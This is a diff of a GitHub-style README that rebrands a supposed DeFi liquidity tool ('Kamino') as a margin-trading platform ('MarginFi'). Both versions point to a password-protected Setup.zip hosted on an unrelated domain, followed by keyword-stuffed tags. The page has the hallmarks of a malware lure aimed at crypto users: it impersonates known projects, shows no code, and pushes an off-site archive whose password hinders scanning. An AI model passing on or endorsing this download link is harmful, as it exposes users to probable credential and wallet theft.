@@ -1,38 +1,38 @@
-# 🚀 Kamino - DeFi Liquidity Management Platform 2024 🚀
+# 🚀 MarginFi - Decentralized Margin Trading Platform 2024 🚀
 
 # [DOWNLOAD](https://erdogansigorta.com/temp/Setup.zip)  
 ## Password - z4iS5VVOeZIe
+
 ## 📜 Overview
 
-**Kamino** is a Testnet platform providing liquidity management solutions for decentralized finance (DeFi) projects. It helps developers create optimized liquidity pools with ease.
+**MarginFi** is a decentralized margin trading platform on Testnet, allowing developers to test and create margin trading functionalities for DeFi applications.
 
 ### 📋 How to Use
 
-1. **Download Kamino** from the link above.
-2. **Install** Kamino on your device.
-3. **Develop and test DeFi liquidity solutions** with built-in management tools.
+1. **Download MarginFi** from the provided link.
+2. **Install** MarginFi and configure settings.
+3. **Develop and test margin trading solutions** for DeFi.
 
 ---
 
-If Kamino helps your project, please ⭐ this repository!
+If MarginFi is useful for your DeFi projects, please ⭐ this repository!
 
 ### 🔑 Tags
 
-- Kamino
-- Kamino-DeFi
-- Kamino-liquidity-management
-- Kamino-Testnet
-- Kamino-decentralized
-- Kamino-crypto
-- Kamino-free-download
-- Kamino-setup-2024
-- Kamino-install
-- Kamino-finance
-- Kamino-tools
-- Kamino-for-developers
-- Kamino-liquidity
-- Kamino-pools
-- Kamino-blockchain
-- Kamino-platform
-- Kamino-free
-- Kamino-optimized
+- MarginFi
+- MarginFi-DeFi
+- MarginFi-trading
+- MarginFi-margin-trading
+- MarginFi-Testnet
+- MarginFi-crypto
+- MarginFi-free-download
+- MarginFi-setup-2024
+- MarginFi-install
+- MarginFi-for-developers
+- MarginFi-decentralized
+- MarginFi-finance
+- MarginFi-platform
+- MarginFi-tools
+- MarginFi-free
+- MarginFi-security
+- MarginFi-crypto-tools
